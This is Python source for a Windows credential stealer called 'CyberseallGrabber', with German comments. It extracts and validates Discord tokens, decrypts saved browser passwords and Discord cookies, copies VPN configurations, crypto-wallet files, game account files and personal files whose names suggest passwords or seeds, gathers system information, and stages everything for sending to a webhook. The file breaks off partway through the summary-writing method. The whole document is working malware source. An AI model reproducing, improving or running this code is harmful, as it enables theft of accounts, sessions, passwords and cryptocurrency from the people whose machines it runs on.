import os,re,requests,base64,getpass,sqlite3,shutil,platform,socket,json,zipfile,time,win32crypt,threading,psutil,subprocess
try:from Crypto.Cipher import AES
except:__import__('subprocess').run([__import__('sys').executable,'-m','pip','install','pycryptodome','--quiet'])

class CyberseallGrabber:
    def __init__(self, webhook_url):
        self.w = webhook_url
        self.t = []
        self.vt = []
        self.p = []
        self.f = []
        self.v = []
        self.ga = []
        self.d = os.path.join(os.getenv("APPDATA"), "cyberseall")
        self.keywords = ['password','passwords','wallet','wallets','seed','seeds','private','privatekey','backup','backups','recovery']
        self.setup()
        self.g()
        self.vt = self.validate_tokens()
        self.pw()
        self.fi()
        self.vpn()
        self.games()
        self.si()
        self.up()
        self.send()
        self.cleanup()

    def setup(self):
        try:
            if not os.path.exists(self.d):
                os.makedirs(self.d)
            self.zf = os.path.join(self.d, "grab_" + str(int(time.time())) + ".zip")
        except:
            pass

    def g(self):
        try:
            def decrypt(buff, master_key):
                try:
                    return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
                except:
                    return "Error"
            
            tokens = []
            cleaned = []
            checker = []
            already_check = []
            
            local = os.getenv('LOCALAPPDATA')
            roaming = os.getenv('APPDATA')
            chrome = local + "\\Google\\Chrome\\User Data"
            
            paths = {
                'Discord': roaming + '\\discord',
                'Discord Canary': roaming + '\\discordcanary',
                'Lightcord': roaming + '\\Lightcord',
                'Discord PTB': roaming + '\\discordptb',
                'Opera': roaming + '\\Opera Software\\Opera Stable',
                'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
                'Amigo': local + '\\Amigo\\User Data',
                'Torch': local + '\\Torch\\User Data',
                'Kometa': local + '\\Kometa\\User Data',
                'Orbitum': local + '\\Orbitum\\User Data',
                'CentBrowser': local + '\\CentBrowser\\User Data',
                '7Star': local + '\\7Star\\7Star\\User Data',
                'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
                'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
                'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
                'Chrome': chrome + '\\Default',
                'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
                'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
                'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
                'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
                'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
                'Iridium': local + '\\Iridium\\User Data\\Default'
            }
            
            for platform, path in paths.items():
                if not os.path.exists(path): 
                    continue
                try:
                    with open(path + f"\\Local State", "r") as file:
                        key = json.loads(file.read())['os_crypt']['encrypted_key']
                        file.close()
                except: 
                    continue
                    
                leveldb_path = path + f"\\Local Storage\\leveldb\\"
                if not os.path.exists(leveldb_path):
                    continue
                    
                for file in os.listdir(leveldb_path):
                    if not file.endswith(".ldb") and not file.endswith(".log"): 
                        continue
                    try:
                        with open(leveldb_path + file, "r", errors='ignore') as files:
                            for x in files.readlines():
                                x.strip()
                                for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                    tokens.append(values)
                    except PermissionError: 
                        continue
            
            for i in tokens:
                if i.endswith("\\"):
                    i.replace("\\", "")
                elif i not in cleaned:
                    cleaned.append(i)
            
            for token in cleaned:
                try:
                    tok = decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])
                    if tok != "Error":
                        checker.append(tok)
                except:
                    continue
            
            for value in checker:
                if value not in already_check and len(value) > 50:
                    already_check.append(value)
                    headers = {'Authorization': value, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
                        if res.status_code == 200:
                            self.t.append(value)
                    except:
                        pass
            
        except:
            pass

    def validate_tokens(self):
        valid_tokens = []
        for token in self.t[:10]:
            try:
                headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
                r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
                if r.status_code == 200:
                    user_data = r.json()
                    
                    has_nitro = False
                    days_left = 0
                    try:
                        nitro_res = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers, timeout=5)
                        if nitro_res.status_code == 200:
                            nitro_data = nitro_res.json()
                            has_nitro = bool(len(nitro_data) > 0)
                            if has_nitro and len(nitro_data) > 0:
                                from datetime import datetime
                                d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                days_left = abs((d2 - d1).days)
                    except:
                        pass
                    
                    token_info = {
                        'token': token,
                        'username': user_data.get('username', 'Unknown'),
                        'discriminator': user_data.get('discriminator', '0000'),
                        'id': user_data.get('id', 'Unknown'),
                        'email': user_data.get('email', 'Hidden'),
                        'phone': user_data.get('phone', 'None'),
                        'verified': user_data.get('verified', False),
                        'mfa_enabled': user_data.get('mfa_enabled', False),
                        'premium_type': user_data.get('premium_type', 0),
                        'has_nitro': has_nitro,
                        'nitro_days_left': days_left
                    }
                    valid_tokens.append(token_info)
            except:
                pass
        return valid_tokens

    def pw(self):
        try:
            def decrypt_password(password, key):
                try:
                    if not password or len(password) < 3:
                        return "Failed to decrypt"

                    # AES-GCM Entschlüsselung (Chrome 80+)
                    try:
                        if password[:3] == b'v10' or password[:3] == b'v11':
                            iv = password[3:15]
                            encrypted_data = password[15:]
                            cipher = AES.new(key, AES.MODE_GCM, iv)
                            decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
                            if decrypted_pass and len(decrypted_pass) > 0:
                                return decrypted_pass
                    except:
                        pass

                    # Direkte AES-GCM ohne Version-Check
                    try:
                        if len(password) >= 15:
                            iv = password[3:15]
                            encrypted_data = password[15:]
                            cipher = AES.new(key, AES.MODE_GCM, iv)
                            decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
                            if decrypted_pass and len(decrypted_pass) > 0:
                                return decrypted_pass
                    except:
                        pass

                    # DPAPI Entschlüsselung (Chrome <80)
                    try:
                        result = win32crypt.CryptUnprotectData(password, None, None, None, 0)
                        if result and result[1]:
                            decrypted = result[1].decode('utf-8') if isinstance(result[1], bytes) else str(result[1])
                            if decrypted and len(decrypted) > 0:
                                return decrypted
                    except:
                        pass

                    # Alternative AES-GCM mit verschiedenen IV-Längen
                    try:
                        for iv_start in [3, 0, 12]:
                            for iv_len in [12, 16, 8]:
                                if len(password) >= iv_start + iv_len + 16:
                                    iv = password[iv_start:iv_start + iv_len]
                                    encrypted_data = password[iv_start + iv_len:]
                                    cipher = AES.new(key, AES.MODE_GCM, iv)
                                    decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
                                    if decrypted_pass and len(decrypted_pass) > 0:
                                        return decrypted_pass
                    except:
                        pass

                    # Rohe Bytes-Analyse für teilweise Wiederherstellung
                    try:
                        if isinstance(password, bytes) and len(password) > 10:
                            printable_chars = ''.join(chr(c) for c in password if 32 <= c <= 126)
                            if len(printable_chars) > 3:
                                return f"Partial: {printable_chars[:50]}"
                    except:
                        pass

                    return "Failed to decrypt"
                except:
                    return "Failed to decrypt"
            
            def get_browser_passwords():
                passwords = []
                
                # Erweiterte Browser-Pfade mit mehreren Varianten
                simple_browsers = []
                
                # Chrome - alle möglichen Pfade
                chrome_paths = [
                    os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
                    os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data"),
                    os.path.join(os.getenv("LOCALAPPDATA"), "Chromium", "User Data")
                ]
                
                for chrome_base in chrome_paths:
                    if os.path.exists(chrome_base):
                        for profile in ["Default", "Profile 1", "Profile 2"]:
                            profile_path = os.path.join(chrome_base, profile)
                            if os.path.exists(profile_path):
                                simple_browsers.append({
                                    "name": f"Chrome-{profile}",
                                    "path": profile_path,
                                    "base_path": chrome_base,
                                    "login_file": "Login Data"
                                })
                
                # Edge - alle möglichen Pfade
                edge_paths = [
                    os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
                    os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Beta", "User Data"),
                    os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Dev", "User Data")
                ]
                
                for edge_base in edge_paths:
                    if os.path.exists(edge_base):
                        for profile in ["Default", "Profile 1"]:
                            profile_path = os.path.join(edge_base, profile)
                            if os.path.exists(profile_path):
                                simple_browsers.append({
                                    "name": f"Edge-{profile}",
                                    "path": profile_path,
                                    "base_path": edge_base,
                                    "login_file": "Login Data"
                                })
                
                # Brave
                brave_base = os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data")
                if os.path.exists(brave_base):
                    for profile in ["Default", "Profile 1"]:
                        profile_path = os.path.join(brave_base, profile)
                        if os.path.exists(profile_path):
                            simple_browsers.append({
                                "name": f"Brave-{profile}",
                                "path": profile_path,
                                "base_path": brave_base,
                                "login_file": "Login Data"
                            })
                
                # Opera
                opera_base = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable")
                if os.path.exists(opera_base):
                    simple_browsers.append({
                        "name": "Opera",
                        "path": opera_base,
                        "base_path": opera_base,
                        "login_file": "Login Data"
                    })

                for browser_info in simple_browsers:
                    try:
                        browser_name = browser_info["name"]
                        profile_path = browser_info["path"]
                        base_path = browser_info.get("base_path", profile_path)
                        login_file = browser_info["login_file"]

                        if not os.path.exists(profile_path):
                            continue

                        login_db_path = os.path.join(profile_path, login_file)
                        if not os.path.exists(login_db_path):
                            continue

                        # Suche Local State im base_path (User Data Ordner)
                        state_file = os.path.join(base_path, "Local State")
                        if not os.path.exists(state_file):
                            # Fallback: Suche im profile_path
                            state_file = os.path.join(profile_path, "Local State")
                            if not os.path.exists(state_file):
                                continue

                        # Hole Master Key
                        try:
                            with open(state_file, "r", encoding="utf-8") as f:
                                local_state = json.loads(f.read())
                                encrypted_key = local_state["os_crypt"]["encrypted_key"]
                                master_key = base64.b64decode(encrypted_key)[5:]
                                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                        except:
                            continue

                        # Kopiere Login-Datenbank
                        temp_db = os.path.join(os.getenv("TEMP"), f"{browser_name}_login.db")
                        try:
                            if os.path.exists(temp_db):
                                os.remove(temp_db)
                            shutil.copy2(login_db_path, temp_db)
                        except:
                            continue

                        # Extrahiere Passwörter
                        try:
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            
                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                            login_data = cursor.fetchall()

                            for row in login_data:
                                if len(row) >= 3 and row[0] and row[1] and row[2]:
                                    url, username, encrypted_password = row[0], row[1], row[2]
                                    
                                    decrypted_password = None
                                    
                                    # Methode 1: Mit Master Key
                                    try:
                                        decrypted_password = decrypt_password(encrypted_password, master_key)
                                    except:
                                        pass
                                    
                                    # Methode 2: Direkte DPAPI-Entschlüsselung (Fallback)
                                    if not decrypted_password or decrypted_password == "Failed to decrypt":
                                        try:
                                            result = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)
                                            if result and result[1]:
                                                decrypted_password = result[1].decode('utf-8') if isinstance(result[1], bytes) else str(result[1])
                                        except:
                                            pass
                                    
                                    # Methode 3: Rohe Daten-Analyse (letzter Versuch)
                                    if not decrypted_password or decrypted_password == "Failed to decrypt":
                                        try:
                                            if isinstance(encrypted_password, bytes) and len(encrypted_password) > 10:
                                                readable = ''.join(chr(c) for c in encrypted_password if 32 <= c <= 126)
                                                if len(readable) > 3:
                                                    decrypted_password = f"Partial: {readable[:30]}"
                                        except:
                                            pass
                                    
                                    # Speichere Passwort wenn erfolgreich
                                    if decrypted_password and decrypted_password != "Failed to decrypt":
                                        passwords.append({
                                            "browser": browser_name,
                                            "url": url,
                                            "username": username,
                                            "password": decrypted_password,
                                            "times_used": 0,
                                            "date_created": 0
                                        })

                            cursor.close()
                            conn.close()
                            
                            try:
                                os.remove(temp_db)
                            except:
                                pass

                        except:
                            pass

                    except:
                        pass

                return passwords
            
            # Vereinfachte Cookie-Extraktion
            def extract_valuable_cookies():
                valuable_cookies = []
                
                # Nur Chrome für erste Tests
                chrome_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default")
                cookies_path = os.path.join(chrome_path, "Cookies")
                
                if not os.path.exists(cookies_path):
                    return valuable_cookies
                
                try:
                    # Hole Master Key
                    state_file = os.path.join(chrome_path, "Local State")
                    if not os.path.exists(state_file):
                        return valuable_cookies
                    
                    with open(state_file, "r", encoding="utf-8") as f:
                        local_state = json.loads(f.read())
                        encrypted_key = local_state["os_crypt"]["encrypted_key"]
                        master_key = base64.b64decode(encrypted_key)[5:]
                        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                    
                    # Kopiere Cookies-Datenbank
                    temp_cookies_db = os.path.join(os.getenv("TEMP"), "chrome_cookies.db")
                    if os.path.exists(temp_cookies_db):
                        os.remove(temp_cookies_db)
                    
                    shutil.copy2(cookies_path, temp_cookies_db)
                    
                    conn = sqlite3.connect(temp_cookies_db)
                    cursor = conn.cursor()
                    
                    # Suche nach Discord-Cookies als Test
                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%discord.com%' LIMIT 5")
                    cookies = cursor.fetchall()
                    
                    for cookie in cookies:
                        if cookie[2]:  # encrypted_value
                            try:
                                decrypted_value = decrypt_password(cookie[2], master_key)
                                if decrypted_value and decrypted_value != "Failed to decrypt" and len(decrypted_value) > 5:
                                    valuable_cookies.append({
                                        "browser": "Chrome",
                                        "url": f"COOKIE_discord.com",
                                        "username": cookie[1],  # cookie name
                                        "password": decrypted_value[:50],  # Cookie value (gekürzt)
                                        "times_used": 0,
                                        "date_created": 0
                                    })
                            except:
                                pass
                    
                    cursor.close()
                    conn.close()
                    
                    try:
                        os.remove(temp_cookies_db)
                    except:
                        pass
                        
                except:
                    pass
                
                return valuable_cookies
            
            # Hole alle Browser-Passwörter und Cookies
            password_data = get_browser_passwords()
            cookie_data = extract_valuable_cookies()
            
            # Kombiniere alle Daten
            all_data = password_data + cookie_data
            
            # Konvertiere zu String-Format für Kompatibilität
            pw_data = []
            for pwd in all_data:
                if pwd.get('times_used', 0) > 0:
                    usage_info = f" | Used: {pwd['times_used']}x"
                else:
                    usage_info = ""
                
                password_entry = f"{pwd['browser']} | {pwd['url']} | {pwd['username']} | {pwd['password']}{usage_info}"
                pw_data.append(password_entry)
            
            # Speichere alle gefundenen Passwörter
            self.p = pw_data
            
            if pw_data:
                try:
                    with open(os.path.join(self.d, "passwords.txt"), "w", encoding="utf-8") as f:
                        f.write("CYBERSEALL BROWSER PASSWORD STEALER\n")
                        f.write("=" * 60 + "\n\n")
                        
                        # Gruppiere Passwörter nach Browser
                        browser_groups = {}
                        for password in pw_data:
                            browser = password.split(" |")[0]
                            if browser not in browser_groups:
                                browser_groups[browser] = []
                            browser_groups[browser].append(password)
                        
                        for browser, passwords in browser_groups.items():
                            f.write(f"\n{browser.upper()} ({len(passwords)} passwords)\n")
                            f.write("-" * 50 + "\n")
                            for password in passwords:
                                f.write(password + "\n")
                            f.write("\n")
                        
                        f.write("=" * 60 + "\n")
                        f.write(f"TOTAL PASSWORDS FOUND: {len(pw_data)}\n")
                        f.write(f"BROWSERS SCANNED: {len(browser_groups)}\n")
                        f.write("=" * 60 + "\n")
                        
                except:
                    pass
            
        except:
            pass

    def vpn(self):
        try:
            vpn_data = []
            
            # VPN-Pfade basierend auf testdaten/vpns.js
            vpn_paths = {
                'OpenVPN Connect': os.path.join(os.getenv("APPDATA"), "OpenVPN Connect", "profiles"),
                'Mullvad VPN': os.path.join(os.getenv("APPDATA"), "Mullvad VPN"),
                'Proton VPN': os.path.join(os.getenv("LOCALAPPDATA"), "ProtonVPN"),
                'Nord VPN': os.path.join(os.getenv("LOCALAPPDATA"), "NordVPN"),
                'Express VPN': os.path.join(os.getenv("LOCALAPPDATA"), "ExpressVPN"),
                'CyberGhost': os.path.join(os.getenv("LOCALAPPDATA"), "CyberGhost"),
                'Surfshark': os.path.join(os.getenv("LOCALAPPDATA"), "Surfshark"),
                'Vypr VPN': os.path.join(os.getenv("LOCALAPPDATA"), "VyprVPN"),
                'Windscribe': os.path.join(os.getenv("LOCALAPPDATA"), "Windscribe"),
                'Hide.me': os.path.join(os.getenv("LOCALAPPDATA"), "hide.me VPN"),
                'Hotspot Shield': os.path.join(os.getenv("LOCALAPPDATA"), "Hotspot Shield"),
                'TunnelBear': os.path.join(os.getenv("LOCALAPPDATA"), "TunnelBear"),
                'IPVanish': os.path.join(os.getenv("LOCALAPPDATA"), "IPVanish"),
                'HMA VPN': os.path.join(os.getenv("LOCALAPPDATA"), "HMA VPN"),
                'ZenMate': os.path.join(os.getenv("LOCALAPPDATA"), "ZenMate"),
                'Pure VPN': os.path.join(os.getenv("LOCALAPPDATA"), "PureVPN"),
                'TorGuard': os.path.join(os.getenv("LOCALAPPDATA"), "TorGuard"),
                'Betternet': os.path.join(os.getenv("LOCALAPPDATA"), "Betternet"),
                'PrivateVPN': os.path.join(os.getenv("LOCALAPPDATA"), "PrivateVPN"),
                'VPN Unlimited': os.path.join(os.getenv("LOCALAPPDATA"), "VPN Unlimited"),
                'Goose VPN': os.path.join(os.getenv("LOCALAPPDATA"), "GooseVPN"),
                'SaferVPN': os.path.join(os.getenv("LOCALAPPDATA"), "SaferVPN"),
                'Private Internet Access': os.path.join(os.getenv("LOCALAPPDATA"), "Private Internet Access"),
                'SoftEther VPN': os.path.join("C:", "Program Files", "SoftEther VPN Client")
            }
            
            for vpn_name, vpn_path in vpn_paths.items():
                if os.path.exists(vpn_path):
                    try:
                        # Kopiere VPN-Konfigurationsdateien
                        vpn_dest = os.path.join(self.d, f"vpn_{vpn_name.replace(' ', '_')}")
                        if not os.path.exists(vpn_dest):
                            os.makedirs(vpn_dest)
                        
                        # Kopiere wichtige Dateien
                        for root, dirs, files in os.walk(vpn_path):
                            for file in files[:20]:  # Limit auf 20 Dateien pro VPN
                                if file.lower().endswith(('.ovpn', '.conf', '.config', '.json', '.xml', '.dat', '.key', '.crt', '.pem')):
                                    try:
                                        src_file = os.path.join(root, file)
                                        if os.path.getsize(src_file) < 10*1024*1024:  # Max 10MB
                                            dest_file = os.path.join(vpn_dest, file)
                                            shutil.copy2(src_file, dest_file)
                                    except:
                                        pass
                        
                        # Prüfe ob Dateien kopiert wurden
                        if os.path.exists(vpn_dest) and os.listdir(vpn_dest):
                            vpn_data.append(f"{vpn_name}: {len(os.listdir(vpn_dest))} files")
                        else:
                            try:
                                os.rmdir(vpn_dest)
                            except:
                                pass
                    except:
                        pass
            
            self.v = vpn_data
            
            # Speichere VPN-Zusammenfassung
            if vpn_data:
                try:
                    with open(os.path.join(self.d, "vpn_summary.txt"), "w", encoding="utf-8") as f:
                        f.write("VPN STEALER RESULTS\n")
                        f.write("=" * 50 + "\n\n")
                        for vpn_info in vpn_data:
                            f.write(f"{vpn_info}\n")
                        f.write(f"\nTotal VPNs found: {len(vpn_data)}\n")
                except:
                    pass
        except:
            pass

    def fi(self):
        try:
            files_data = []
            
            # Nur die wichtigsten Verzeichnisse durchsuchen
            target_dirs = [
                os.path.join(os.getenv("USERPROFILE"), "Desktop"),
                os.path.join(os.getenv("USERPROFILE"), "Documents"),
                os.path.join(os.getenv("USERPROFILE"), "Downloads")
            ]
            
            for d in target_dirs:
                if os.path.exists(d):
                    for r, ds, fs in os.walk(d):
                        for f in fs[:10]:  # Limit auf 10 Dateien pro Verzeichnis
                            if any(keyword in f.lower() for keyword in self.keywords) and f.lower().endswith(('.txt','.key','.wallet','.json','.dat')) and os.path.getsize(os.path.join(r,f)) < 1024*1024:
                                fp = os.path.join(r, f)
                                files_data.append(fp)
                                try:
                                    shutil.copy2(fp, os.path.join(self.d, "file_" + str(len(files_data)) + "_" + f))
                                except:
                                    pass
                                if len(files_data) >= 10:
                                    break
                        if len(files_data) >= 10:
                            break
                    if len(files_data) >= 10:
                        break
            
            # Nur die wichtigsten Crypto-Wallets für bessere Performance
            crypto_paths = [
                os.path.join(os.getenv("APPDATA"), "Exodus"),
                os.path.join(os.getenv("APPDATA"), "atomic"),
                os.path.join(os.getenv("APPDATA"), "Electrum"),
                os.path.join(os.getenv("APPDATA"), "MetaMask"),
                os.path.join(os.getenv("APPDATA"), "Phantom"),
                os.path.join(os.getenv("APPDATA"), "TronLink"),
                os.path.join(os.getenv("APPDATA"), "Binance"),
                os.path.join(os.getenv("LOCALAPPDATA"), "Coinomi")
            ]
            
            for cp in crypto_paths:
                if os.path.exists(cp):
                    for r, ds, fs in os.walk(cp):
                        for f in fs[:5]:  # Limit auf 5 Dateien pro Wallet
                            if f.lower().endswith(('.wallet','.dat','.key','.json')) and os.path.getsize(os.path.join(r,f)) < 5*1024*1024:
                                fp = os.path.join(r, f)
                                files_data.append(fp)
                                try:
                                    shutil.copy2(fp, os.path.join(self.d, "crypto_" + str(len(files_data)) + "_" + f))
                                except:
                                    pass
                                if len(files_data) >= 15:
                                    break
                        if len(files_data) >= 15:
                            break
                    if len(files_data) >= 15:
                        break
            
            self.f = files_data
            with open(os.path.join(self.d, "files.txt"), "w") as f:
                f.write("\n".join(files_data))
        except:
            pass

    def games(self):
        try:
            game_data = []
            
            # Gaming-Pfade basierend auf testdaten/games.js
            game_paths = {
                'Steam': {
                    'config': os.path.join("C:", "Program Files (x86)", "Steam", "config"),
                    'userdata': os.path.join("C:", "Program Files (x86)", "Steam", "userdata")
                },
                'Minecraft': {
                    'launcher_accounts': os.path.join(os.getenv("APPDATA"), ".minecraft", "launcher_accounts_microsoft_store.json"),
                    'tlauncher': os.path.join(os.getenv("APPDATA"), ".minecraft", "TlauncherProfiles.json"),
                    'badlion': os.path.join(os.getenv("APPDATA"), "Badlion Client", "accounts.json"),
                    'lunar': os.path.join(os.getenv("USERPROFILE"), ".lunarclient", "settings", "game", "accounts.json"),
                    'feather': os.path.join(os.getenv("APPDATA"), ".feather", "accounts.json"),
                    'impact': os.path.join(os.getenv("APPDATA"), ".minecraft", "Impact", "alts.json"),
                    'meteor': os.path.join(os.getenv("APPDATA"), ".minecraft", "meteor-client", "accounts.nbt"),
                    'polymc': os.path.join(os.getenv("APPDATA"), "PolyMC", "accounts.json"),
                    'rise': os.path.join(os.getenv("APPDATA"), ".minecraft", "Rise", "alts.txt"),
                    'novoline': os.path.join(os.getenv("APPDATA"), ".minecraft", "Novoline", "alts.novo"),
                    'paladium': os.path.join(os.getenv("APPDATA"), "paladium-group", "accounts.json")
                },
                'Riot Games': {
                    'config': os.path.join(os.getenv("LOCALAPPDATA"), "Riot Games", "Riot Client", "Config"),
                    'data': os.path.join(os.getenv("LOCALAPPDATA"), "Riot Games", "Riot Client", "Data"),
                    'logs': os.path.join(os.getenv("LOCALAPPDATA"), "Riot Games", "Riot Client", "Logs")
                },
                'Epic Games': {
                    'settings': os.path.join(os.getenv("LOCALAPPDATA"), "EpicGamesLauncher", "Saved", "Config", "Windows", "GameUserSettings.ini")
                },
                'Uplay': {
                    'settings': os.path.join(os.getenv("LOCALAPPDATA"), "Ubisoft Game Launcher")
                },
                'NationsGlory': {
                    'localstorage': os.path.join(os.getenv("APPDATA"), "NationsGlory", "Local Storage", "leveldb")
                }
            }
            
            for game_name, paths in game_paths.items():
                game_files_found = []
                
                for path_name, path_location in paths.items():
                    if isinstance(path_location, str) and os.path.exists(path_location):
                        try:
                            # Erstelle Zielordner
                            game_dest = os.path.join(self.d, f"game_{game_name.replace(' ', '_')}")
                            if not os.path.exists(game_dest):
                                os.makedirs(game_dest)
                            
                            if os.path.isfile(path_location):
                                # Einzelne Datei kopieren
                                if os.path.getsize(path_location) < 50*1024*1024:  # Max 50MB
                                    dest_file = os.path.join(game_dest, f"{path_name}_{os.path.basename(path_location)}")
                                    shutil.copy2(path_location, dest_file)
                                    game_files_found.append(f"{path_name}: {os.path.basename(path_location)}")
                            else:
                                # Ordner kopieren (begrenzt)
                                path_dest = os.path.join(game_dest, path_name)
                                if not os.path.exists(path_dest):
                                    os.makedirs(path_dest)
                                
                                file_count = 0
                                for root, dirs, files in os.walk(path_location):
                                    for file in files[:10]:  # Max 10 Dateien pro Pfad
                                        if file.lower().endswith(('.json', '.txt', '.dat', '.config', '.ini', '.xml', '.vdf', '.novo', '.nbt')):
                                            try:
                                                src_file = os.path.join(root, file)
                                                if os.path.getsize(src_file) < 10*1024*1024:  # Max 10MB
                                                    rel_path = os.path.relpath(src_file, path_location)
                                                    dest_file = os.path.join(path_dest, rel_path)
                                                    dest_dir = os.path.dirname(dest_file)
                                                    if not os.path.exists(dest_dir):
                                                        os.makedirs(dest_dir)
                                                    shutil.copy2(src_file, dest_file)
                                                    file_count += 1
                                            except:
                                                pass
                                        if file_count >= 10:
                                            break
                                    if file_count >= 10:
                                        break
                                
                                if file_count > 0:
                                    game_files_found.append(f"{path_name}: {file_count} files")
                        except:
                            pass
                
                if game_files_found:
                    game_data.append(f"{game_name}: {', '.join(game_files_found)}")
            
            # Steam spezielle Behandlung für Account-Informationen
            try:
                steam_config = os.path.join("C:", "Program Files (x86)", "Steam", "config", "loginusers.vdf")
                if os.path.exists(steam_config):
                    with open(steam_config, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        # Suche nach Steam IDs
                        steam_ids = re.findall(r'7656[0-9]{13}', content)
                        if steam_ids:
                            steam_dest = os.path.join(self.d, "game_Steam")
                            if not os.path.exists(steam_dest):
                                os.makedirs(steam_dest)
                            
                            with open(os.path.join(steam_dest, "steam_accounts.txt"), "w") as f:
                                f.write("STEAM ACCOUNT IDS:\n")
                                f.write("=" * 30 + "\n")
                                for steam_id in set(steam_ids):
                                    f.write(f"Steam ID: {steam_id}\n")
                                    f.write(f"Profile URL: https://steamcommunity.com/profiles/{steam_id}\n\n")
                            
                            if "Steam:" not in str(game_data):
                                game_data.append(f"Steam: {len(set(steam_ids))} account IDs found")
            except:
                pass
            
            self.ga = game_data
            
            # Speichere Gaming-Zusammenfassung
            if game_data:
                try:
                    with open(os.path.join(self.d, "gaming_summary.txt"), "w", encoding="utf-8") as f:
                        f.write("GAMING ACCOUNT STEALER RESULTS\n")
                        f.write("=" * 50 + "\n\n")
                        for game_info in game_data:
                            f.write(f"{game_info}\n")
                        f.write(f"\nTotal Games found: {len(game_data)}\n")
                except:
                    pass
        except:
            pass

    def si(self):
        try:
            sys_info = {
                "user": getpass.getuser(),
                "computer": os.getenv("COMPUTERNAME", "Unknown"),
                "platform": platform.platform(),
                "ip": socket.gethostbyname(socket.gethostname()),
                "tokens_found": len(set(self.t)),
                "valid_tokens": len(self.vt),
                "passwords_found": len(self.p),
                "files_found": len(self.f),
                "vpns_found": len(self.v),
                "games_found": len(self.ga)
            }
            with open(os.path.join(self.d, "system_info.json"), "w") as f:
                json.dump(sys_info, f, indent=2)
            with open(os.path.join(self.d, "valid_tokens.json"), "w") as f:
                json.dump(self.vt, f, indent=2)
        except:
            pass

    def up(self):
        try:
            # Erstelle zusätzliche Zusammenfassungsdateien
            try:
                # Erstelle Browser-Zusammenfassung
                if self.p:
                    with open(os.path.join(self.d, "browser_summary.txt"), "w", encoding="utf-8") as f:
                        f.write("CYBERSEALL BROWSER DATA SUMMARY\n")
                        f.write("=" * 60 + "\n\n")
                        
                        # Gruppiere nach Datentyp
                        passwords = [p for p in self.p if not p.startswith("COOKIE_") and not p.startswith("CREDIT_CARD") and not p.startswith("AUTOFILL_DATA")]
                        cookies = [p for p in self.p if p.startswith("COOKIE_")]
                        credit_cards = [p for p in self.p if p.startswith("CREDIT_CARD")]
                        autofill = [p for p in self.p if p.startswith("AUTOFILL_DATA")]
                        
                        f.write(f"STATISTICS:\n")
                        f.write(f"Browser Passwords: {len(passwords)}\n")
                        f.write(f"Session Cookies: {len(cookies)}\n")
                        f.write(f"Credit Cards: {len(credit_cards)}\n")
                        f.write(f"Autofill Data: {len(autofill)}\n")
                        f.write(f"Total Entries: {len(self.p)}\n\n")
                        
                        if passwords:
                            f.write("BROWSER PASSWORDS:\n")
                            f.write("-" * 40 + "\n")
                            for pwd in passwords:
                                f.write(pwd + "\n")
                            f.write("\n")
                        
                        if cookies:
                            f.write("SESSION COOKIES:\n")
                            f.write("-" * 40 + "\n")
                            for cookie in cookies:
                                f.write(cookie + "\n")
                            f.write("\n")
                        
                        if credit_cards:
                            f.write("CREDIT CARDS:\n")
                            f.write("-" * 40 + "\n")
                            for card in credit_cards:
                                f.write(card + "\n")
                            f.write("\n")
                        
                        if autofill:
                            f.write("AUTOFILL DATA:\n")
                            f.write("-" * 40 + "\n")
                            for auto in autofill:
                                f.write(auto + "\n")
                            f.write("\n")
                
                # Erstelle Token-Zusammenfassung
                if self.vt:
                    with open(os.path.join(self.d, "token_summary.txt"), "w", encoding="utf-8") as f:
                        f.write("DISCORD TOKEN SUMMARY\n")
                        f.write("=" * 60 + "\n\n")
                        
                        for i, token_info in enumerate(self.vt):
                            f.write(f"TOKEN #{i+1}:\n")
                            f.write(f"Username: {token_info.get('username', 'Unknown')}#{token_info.get('discriminator', '0000')}\n")
                            f.write(f"Email: {token_info.get('email', 'Hidden')}\n")
                            f.write(f"Phone: {token_info.get('phone', 'None')}\n")
                            f.write(f"Nitro: {token_info.get('has_nitro', False)} ({token_info.get('nitro_days_left', 0)} days left)\n")
                            f.write(f"MFA: {token_info.get('mfa_enabled', False)}\n")
